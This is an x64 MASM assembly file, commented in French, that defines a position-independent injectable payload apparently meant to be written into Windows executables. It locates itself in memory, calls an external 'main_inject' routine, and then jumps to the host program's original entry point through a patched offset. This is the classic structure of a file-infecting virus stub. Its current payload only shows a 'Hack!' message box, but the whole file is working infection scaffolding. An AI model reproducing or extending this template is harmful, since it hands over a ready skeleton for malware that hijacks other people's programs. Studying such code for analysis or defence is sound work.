; === DÉCLARATIONS PUBLIQUES ===
public __begin_of_code      ; Marqueur de début du code injectable
public payload              ; Point d'entrée principal du payload
public delta                ; Offset vers l'ancien point d'entrée
public __kern32             ; Pointeur vers kernel32.dll
public __kern32_str         ; Chaîne kernel32.dll en Unicode
public __loadlib_str        ; Chaîne "LoadLibraryA"
public __getproc_str        ; Chaîne "GetProcAddress"
public __user32_str         ; Chaîne "user32.dll"
public __msgbox_str         ; Chaîne "MessageBoxA"
public __msgbox_title_str   ; Chaîne "Title"
public __msgbox_content_str ; Chaîne "Hack!"

extern main_inject: proto   ; Fonction C d'injection principale

inject SEGMENT READ EXECUTE ; Section exécutable du payload

__begin_of_code:           ; Marqueur de début pour calculs d'offset
payload proc               ; Début de la procédure payload

    ; === RÉSOLUTION D'ADRESSE COURANTE (PIC) ===
    call _next             ; Appel à l'instruction suivante
_next:                     ; Étiquette de destination
    pop rbp                ; RBP = adresse de _next (technique PIC classique)
    sub rbp, _next - payload ; RBP = adresse de base du payload
    
    ; === ALIGNEMENT DE LA PILE ===
    sub rsp, 64            ; Réservation d'espace sur la pile
    and rsp, -1            ; Alignement de la pile (redondant ici)
    
    ; === PRÉPARATION DE L'APPEL À main_inject ===
    push rbp               ; Sauvegarde de l'adresse de base
    push rbp               ; Duplication pour l'argument
    pop rcx                ; RCX = adresse de base (1er argument x64)
    
_follow:
    call main_inject       ; Appel à la fonction C d'injection
    
    ; === REDIRECTION VERS L'ANCIEN POINT D'ENTRÉE ===
    push rbp               ; Sauvegarde de l'adresse de base
    mov rbx, [rbp + (delta - payload)]  ; Chargement de l'offset original
    add rbx, rbp           ; Calcul de l'adresse absolue
    jmp rbx                ; Saut vers l'ancien point d'entrée

vars:                      ; Section des variables
    ; === OFFSET VERS L'ANCIEN POINT D'ENTRÉE ===
delta label QWORD
    dq 0                   ; Sera modifié par l'injecteur

__kern32 label QWORD
    dq 0                   ; Réservé pour adresse kernel32

    ; === CHAÎNE KERNEL32.DLL EN UNICODE ===
__kern32_str label BYTE
    db 'c', 0, ':', 0, '\', 0, 'w', 0, 'i', 0, 'n', 0, 'd', 0
    db 'o', 0, 'w', 0, 's', 0, '\', 0, 's', 0, 'y', 0, 's', 0, 't'
    db 0, 'e', 0, 'm', 0, '3', 0, '2', 0, '\', 0, 'k', 0, 'e', 0, 'r'
    db 0, 'n', 0, 'e', 0, 'l', 0, '3', 0, '2', 0, '.', 0, 'd', 0, 'l', 0
    db 'l', 0, 0, 0
    ; "c:\windows\system32\kernel32.dll" en UTF-16

    ; === CHAÎNES D'API EN ASCII ===
__loadlib_str label BYTE
    db "LoadLibraryA", 0   ; API pour charger une DLL

__getproc_str label BYTE
    db "GetProcAddress", 0 ; API pour résoudre une fonction

__user32_str label BYTE
    db "user32.dll", 0     ; Nom de la DLL utilisateur

__msgbox_str label BYTE
    db "MessageBoxA", 0    ; API d'affichage de message

__msgbox_title_str label BYTE
    db "Title", 0          ; Titre du message

__msgbox_content_str label BYTE
    db "Hack!", 0          ; Contenu du message

payload endp
inject ENDS
END